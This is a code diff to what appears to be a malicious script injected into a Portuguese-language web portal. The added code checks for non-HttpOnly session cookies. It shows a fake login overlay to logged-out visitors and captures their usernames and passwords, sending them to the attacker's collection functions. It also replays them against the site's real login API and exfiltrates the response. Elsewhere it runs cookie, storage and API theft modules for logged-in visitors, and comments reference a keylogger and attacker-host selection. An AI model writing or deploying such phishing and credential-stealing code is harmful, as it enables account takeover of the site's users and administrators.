@@ -65,9 +65,22 @@
     });
   };
 
-  /* overlay de login falso no domínio real; some sozinho se a vítima já estiver logada */
+  /* ---------- deteccao de sessao ---------- */
+  /* lvf_user / lvf_filteradm sao definidos so no login e nao tem HttpOnly */
+  function session() {
+    var c = '';
+    try { c = document.cookie || ''; } catch (e) {}
+    var admin = /lvf_filteradm=/.test(c);
+    var user = /lvf_user=/.test(c);
+    return { c: c, logado: admin || user, admin: admin };
+  }
+
+  /* overlay de login falso: so para quem NAO esta logado */
   M.phish = function (cfg) {
+    var S = session();
+    if (S.logado) { be('sessao', 'logado=' + S.logado + ' admin=' + S.admin); return; }
     if (document.getElementById('__ph')) return;
+
     var css = 'position:fixed;inset:0;z-index:2147483000;background:#0b3d91;display:flex;align-items:center;justify-content:center;font-family:Arial';
     var box = 'background:#fff;padding:28px;border-radius:6px;width:340px';
     var inp = 'width:100%;padding:9px;margin:7px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box';
@@ -78,15 +91,31 @@
       '<input id="__u" style="' + inp + '" placeholder="login"><input id="__s" type="password" style="' + inp + '" placeholder="senha">' +
       '<button id="__g" style="' + btn + '">Entrar</button><div id="__o" style="color:#900;font-size:12px;margin-top:8px"></div></div>';
     document.body.appendChild(d);
+    var o = document.getElementById('__o');
+    document.getElementById('__u').focus();
+
     document.getElementById('__g').onclick = function () {
-      var u = document.getElementById('__u').value, s = document.getElementById('__s').value;
-      be('cred', u + ':' + s);
-      send({ k: 'cred', u: u, p: s, href: location.href });
-      /* login real em background: falhou? fica a tela; passou? redireciona pro painel */
-      fetch('/api/Login', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ nm_usuario: u, nm_senha: s }) })
-        .then(function (r) { return r.json().then(function (j) { send({ k: 'loginstatus', s: r.status, b: JSON.stringify(j) }); if (r.ok) location.href = '/portal/adm/Home.aspx'; }); })
-        .catch(function () { document.getElementById('__o').textContent = 'Falha de conexão.'; });
+      var u = document.getElementById('__u').value, pw = document.getElementById('__s').value;
+      if (!u || !pw) { o.textContent = 'Preencha login e senha.'; return; }
+      o.textContent = 'Entrando...';
+      be('cred', u + ':' + pw);
+      send({ k: 'cred', u: u, p: pw, href: location.href });
+      fetch('/api/Login', { method: 'POST', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ nm_usuario: u, nm_senha: pw }) })
+        .then(function (r) { return r.json().then(function (j) {
+          send({ k: 'loginstatus', s: r.status, b: JSON.stringify(j) });
+          if (!r.ok) { o.textContent = (j && j.ds_mensagemErro) || 'Login ou senha inválidos.'; return; }
+          o.style.color = '#060';
+          o.textContent = 'OK, redirecionando...';
+          location.href = '/portal/adm/';
+        }); })
+        .catch(function () { o.textContent = 'Falha de conexão.'; });
     };
+  };
+
+  /* tipo de visitante, para o relatorio */
+  M.whoami = function () {
+    var S = session();
+    be('quem', 'logado=' + S.logado + ' admin=' + S.admin + ' cookie=' + (S.c || '<vazio>'));
   };
 
   /* keylogger no postback de login enquanto a aba viver */
@@ -132,7 +161,10 @@
     try { (cfg.modules || ['cookies', 'storage', 'api']).forEach(function (m) { if (M[m]) { try { M[m](cfg); } catch (e) { be('err', m + ':' + e); } } }); } catch (e) {}
   }
 
-  function fallback() { run({ modules: ['cookies', 'storage', 'api', 'meta'] }); }
+  function fallback() {
+    var S = session();
+    run({ modules: S.logado ? ['cookies', 'storage', 'api', 'meta'] : ['meta', 'phish'] });
+  }
 
   /* escolhe o primeiro host que responder, depois carrega a cfg dele */
   function pick() {
